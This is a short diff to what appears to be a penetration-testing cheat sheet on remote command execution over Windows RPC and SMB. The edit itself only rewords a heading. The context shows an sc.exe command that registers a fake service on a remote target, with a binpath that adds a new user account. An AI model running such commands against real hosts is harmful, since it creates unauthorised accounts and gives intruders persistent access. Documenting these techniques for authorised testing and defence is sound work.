@@ -60,8 +60,7 @@ If RPC fails:
 |:--:|
 | Try communicating using an SMB named pipe |
 
-
-Register the dummy service (binpath is the command to run on the host)
+Register the fake service (`binpath` is the command to run on the host)
 
     sc.exe \\<IP Target> create <fakeservice> binpath= "net user <username> <password> /add" start= auto
 
